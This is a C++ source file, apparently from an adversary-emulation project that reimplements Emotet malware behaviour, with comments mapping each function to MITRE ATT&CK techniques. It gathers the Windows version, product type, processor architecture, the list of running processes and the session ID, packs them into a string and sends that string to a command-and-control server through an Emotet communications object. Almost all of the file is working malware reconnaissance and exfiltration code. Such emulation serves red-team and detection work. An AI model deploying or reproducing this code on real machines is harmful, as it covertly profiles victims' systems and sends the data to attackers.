#include "pch.h"
#include "hostdiscovery.h"
#include "comms.h"


/*
 * Wrapper for RtlGetVersion
 */
 // https://stackoverflow.com/questions/36543301/detecting-windows-10-version/36543774#36543774
RTL_OSVERSIONINFOW GetOSVersion() {
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        // Function pointer of RtlGetVersion
        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)::GetProcAddress(hMod, "RtlGetVersion");
        if (fxPtr != NULL) {
            RTL_OSVERSIONINFOW OSData = { 0 };
            OSData.dwOSVersionInfoSize = sizeof(OSData);
            if (STATUS_SUCCESS == fxPtr(&OSData)) {
                return OSData;
            }
        }
    }

    RTL_OSVERSIONINFOW OSData = { 0 };
    return OSData;
}

/*
 * Wrapper for RtlGetNtProductType
 */
bool GetNtProductType(PNT_PRODUCT_TYPE PNtProductType) {
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        // Function pointer of RtlGetNtProductType
        RtlGetNtProductTypePtr fxPtr = (RtlGetNtProductTypePtr)::GetProcAddress(hMod, "RtlGetNtProductType");
        if (fxPtr != NULL) {
            return fxPtr(PNtProductType);
        }
    }

    return false;
}

/*
 * collectOSData:
 *      About:
 *          Collects Operating System information such as OS Version,
 *          NT Product Type, and Processor Architecture
 *      Result:
 *          Returns commulative value of OS information based on CTI, -1 on error
 *      MITRE ATT&CK Techniques:
 *          T1082: System Information Discovery
 *      Source:
 *          https://unit42.paloaltonetworks.com/emotet-command-and-control/
 */
int collectOSData() {

    RTL_OSVERSIONINFOW OSVersion = GetOSVersion();
    // OSVERSIONINFOW structure src:
    // https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_osversioninfow
    if (OSVersion.dwOSVersionInfoSize == 0) {
        printf("Could not retrieve OS information...\n");
        return -1;
    }

    LPSYSTEM_INFO NativeSystemInfo = new SYSTEM_INFO();
    // Set processor architecture to unkown to test if function ran
    NativeSystemInfo->wProcessorArchitecture = PROCESSOR_ARCHITECTURE_UNKNOWN;
    GetNativeSystemInfo(NativeSystemInfo); // No return value

    // SYSTEM_INFO structure src:
    // https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-system_info
    if (NativeSystemInfo->wProcessorArchitecture == PROCESSOR_ARCHITECTURE_UNKNOWN) {
        printf("Processor Architecture unknown.\n");
        return -1;
    }

    // Get NT Product Type
    NT_PRODUCT_TYPE NtProductType = Undefined;
    if (!GetNtProductType(&NtProductType)) {
        printf("Error getting NT product type\n");
        return -1;
    }

    // Calculate commulative value with static numbers based on CTI
    return (NtProductType * 0x186A0) + (OSVersion.dwMajorVersion * 0x3e8) + (OSVersion.dwMinorVersion * 0x64) + (NativeSystemInfo->wProcessorArchitecture);
}

/*
 * generateProcessData:
 *      About:
 *          Collects list of running processes and stores names in WCHAR* parameter
 *      Result:
 *          Returns boolean, true if it was successful, false if not
 *      MITRE ATT&CK Techniques:
 *          T1057: Process Discovery
 *      Source:
 *          https://unit42.paloaltonetworks.com/emotet-command-and-control/
 */
bool generateProcessData(WCHAR *processesInfo) {
    HANDLE snapshot;
    PROCESSENTRY32 pe;

    // Src: https://dmfrsecurity.com/2021/04/18/enumerating-processes-with-createtoolhelp32snapshot/
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("Unable to grab handle to snapshot\n");
        return false;
    }

    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &pe)) {
        printf("Unable to grab first process from snapshot\n");
        CloseHandle(snapshot);
        return false;
    }

    WCHAR comma[3] = L", ";
    do {
        if ((wcslen(processesInfo) + wcslen(pe.szExeFile)+2) < PROCESS_LIST_SIZE) {
            // Apppend process name
            wcsncat_s(processesInfo, PROCESS_LIST_SIZE, pe.szExeFile, wcslen(pe.szExeFile));
            wcsncat_s(processesInfo, PROCESS_LIST_SIZE, comma, 3);
        }
        else {
            printf("Need bigger size\n");
            return false;
        }
    } while (Process32Next(snapshot, &pe));

    CloseHandle(snapshot);

    return true;
}

/*
 * getCurrentSessionId:
 *      About:
 *          Gets Remote Service Service session id of current process ID
 *      Result:
 *          Returns integer of session id, -1 if it failed
 *      MITRE ATT&CK Techniques:
 *          T1057: Process Discovery
 *      Source:
 *          https://unit42.paloaltonetworks.com/emotet-command-and-control/
 */
int getCurrentSessionId() {
    DWORD pid = GetCurrentProcessId();
    DWORD sessionid = 0;
    if (!ProcessIdToSessionId(pid, &sessionid)) {
        printf("Unable to get session id of remote desktop services\n");
        return -1;
    }
    return sessionid;
}

/*
 * HostDiscovery:
 *      About:
 *          Gathers OS information, running processes, and RDS session id of current process
 *          Sends information to C2 through HTTP
 *      Result:
 *          Returns boolean, true on success, false on failure
 *      MITRE ATT&CK Techniques:
 *          T1057: Process Discovery
 *          T1071.001: Application Layer Protocol: Web Protocols
 *          T1082: System Information Discovery
 *      Source:
 *          https://unit42.paloaltonetworks.com/emotet-command-and-control/
 */
bool HostDiscovery(EmotetComms* comms) {
    // System Information Discovery
    int OSData = collectOSData();
    if (OSData == -1) {
        return false;
    }

    // Process discovery
    WCHAR *processesInfo = (WCHAR*)calloc(PROCESS_LIST_SIZE, sizeof(WCHAR)); // allocate memory in heap
    if (!generateProcessData(processesInfo)) {
        return false;
    }

    int sessionID = getCurrentSessionId();
    if (sessionID == -1) {
        return false;
    }

    // Prepare data
    string data = "OSData:" + std::to_string(OSData) + ":";
    if (processesInfo) {
        // Conver to string
        wstring ws(processesInfo);
        string processesInfoStr(ws.begin(), ws.end());
        data += "processInfo:" + processesInfoStr + ":";
    }
    data += "sessionID:" + std::to_string(sessionID) + ":";

    // Send info to C2 and return boolean of status
    return comms->sendOutput(data);
}

/*
 * getCurrentDirectory:
 *      About: 
 *          Grabs current directory
 *      Result:
 *          Returns string of current directory, empty if it is not able to
 */
string getCurrentDirectory() {
    char currentDir[BUFSIZE];
    DWORD size = GetCurrentDirectoryA(BUFSIZE, currentDir);
    if (size == 0) {
        return "";
    }
    return string(currentDir);
}

/*
 * getUserRootDirectory:
 *      About:
 *          Grabs root directory of current user
 *      Result:
 *          Returns string of root directory, empty if it is not able to
 */
string getUserRootDirectory() {
    HANDLE hToken = NULL;
    DWORD pathLen = MAX_PATH;
    char userRootDir[BUFSIZE];
    userRootDir[0] = '\0';
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        GetUserProfileDirectoryA(hToken, (LPSTR)userRootDir, &pathLen);
        CloseHandle(hToken);
    }
    return string(userRootDir);
}